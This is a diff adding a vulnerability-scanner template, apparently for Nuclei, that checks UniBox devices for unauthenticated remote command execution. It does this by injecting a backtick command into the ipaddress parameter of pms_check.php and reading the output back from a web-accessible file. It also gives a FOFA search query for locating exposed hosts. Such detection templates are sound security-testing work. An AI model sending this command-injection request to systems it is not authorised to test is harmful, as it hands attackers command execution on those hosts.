@@ -1,0 +1,29 @@
+http:
+    - matchers:
+        - dsl:
+            - status_code==200 && contains_all(body,"uid=","gid=")
+          name: 远程命令执行
+          type: dsl
+      raw:
+        - |
+          GET /billing/pms_check.php?ipaddress=`id>/usr/local/unibox-0.9/network/upload.txt` HTTP/1.1
+          Host: {{Host}}
+          User-Agent: Mozilla/5.0
+          Content-Length: 30
+        - |
+          GET /network/upload.txt HTTP/1.1
+          Host: {{Host}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+          Cookie: RUIJIEID={{ruijie_cookie}}
+id: unibox-pms_check-RCE
+info:
+    author: HuanXiong
+    description: |-
+        fofa: body="UniBox"
+        unibox pms_check 接口存在远程命令执行漏洞，未经身份验证的恶意攻击者可以利用该漏洞远程执行任意命令，获取系统权限。
+    name: unibox pms_check 远程命令执行
+    reference:
+        - null
+    severity: critical
+    tags:
+        - unibox
